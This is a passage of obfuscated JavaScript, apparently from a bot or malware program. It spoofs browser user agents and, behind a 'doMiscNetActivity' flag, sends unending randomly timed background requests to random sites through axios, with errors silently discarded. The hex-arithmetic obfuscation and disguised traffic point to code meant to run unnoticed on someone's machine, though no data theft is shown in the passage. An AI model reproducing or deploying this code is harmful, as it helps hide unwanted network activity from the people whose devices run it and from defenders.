      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x242b + 0x4 * -0x23 + 0xc3d * 0x3; k < -0x1 * 0x117f + 0x2 * 0xae7 + -0x7 * 0x9d; k++)
    setTimeout(f, (-0x13309 * -0x1 + -0x1105c + 0xc7b3) * k * getRandomInt(0x1 * -0x1538 + 0x2eb + -0x61a * -0x3, -0x3d * -0x47 + 0x1733 + -0x1 * 0x281b));
  setInterval(() => {
    f();
    for (let l = 0x1b38 + 0x118 + -0x1c50; l < -0x3 * -0x5bb + 0x207 * -0x3 + -0xb18; l++)
      setTimeout(f, (0x133f7 + -0x136f * 0xd + 0xb30c) * l * getRandomInt(-0x1256 + -0x2399 + 0x35f * 0x10, 0x34e + -0x1 * 0x16dd + -0x1e * -0xa7));
  }, 0x9a5 * -0x925 + -0x157039 + 0xa49092);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x16f0 + -0x9e3 + 0xe4b) * getRandomInt(-0x220f + 0x19 * -0xac + 0x32dc, 0x2 * -0x1043 + -0xcb8 + 0x2d43));
}, -0x14da + -0x39a * 0x2 + 0x1c72);